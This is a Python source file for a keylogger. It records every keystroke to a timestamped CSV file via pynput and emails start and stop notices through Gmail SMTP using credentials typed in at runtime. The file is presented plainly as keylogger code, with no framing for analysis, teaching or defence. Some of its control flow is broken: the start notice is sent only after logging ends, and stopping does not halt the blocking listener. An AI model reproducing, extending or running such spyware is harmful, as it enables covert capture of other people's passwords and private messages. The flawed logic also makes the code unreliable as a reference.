import os
import csv
import threading
import smtplib
import getpass
from pynput import keyboard
from datetime import datetime
from email.message import EmailMessage

class Keylogger:
    def __init__(self, log_dir, email_config):
        self.log_dir = log_dir
        self.log_path = os.path.join(log_dir, "keylog.csv")
        self.running = False
        self.lock = threading.Lock()
        self.email_config = email_config

    def start(self):
        self.running = True
        self.start_logging()
        self.send_email_notification("Keylogger started")

    def stop(self):
        self.running = False
        self.send_email_notification("Keylogger stopped")

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = ' '
            else:
                char = f'[{key.name}]'

        with self.lock:
            with open(self.log_path, 'a', newline='') as log_file:
                writer = csv.writer(log_file)
                writer.writerow([datetime.now(), char])

    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            while self.running:
                listener.join()

    def send_email_notification(self, message):
        try:
            email_message = EmailMessage()
            email_message.set_content(message)
            email_message['Subject'] = "Keylogger Notification"
            email_message['From'] = self.email_config['sender_email']
            email_message['To'] = self.email_config['receiver_email']

            with smtplib.SMTP(self.email_config['smtp_server'], self.email_config['smtp_port']) as server:
                server.starttls()
                server.login(self.email_config['sender_email'], self.email_config['password'])
                server.send_message(email_message)
        except Exception as e:
            print(f"Error sending email notification: {e}")

if __name__ == "__main__":
    log_directory = input("Enter the directory to save the logs (press Enter for default directory): ").strip()
    if not log_directory:
        log_directory = os.path.join(os.getcwd(), "Keylogs")

    if not os.path.exists(log_directory):
        os.makedirs(log_directory)

    email_config = {
        "sender_email": input("Enter your email address: ").strip(),
        "password": getpass.getpass("Enter your email password: "),
        "receiver_email": input("Enter the email address to receive notifications: ").strip(),
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587
    }

    keylogger = Keylogger(log_directory, email_config)
    keylogger_thread = threading.Thread(target=keylogger.start)

    print("Keylogger started. Press 'q' to stop.")
    keylogger_thread.start()

    while True:
        if input() == 'q':
            keylogger.stop()
            keylogger_thread.join()
            print("Keylogger stopped.")
            break
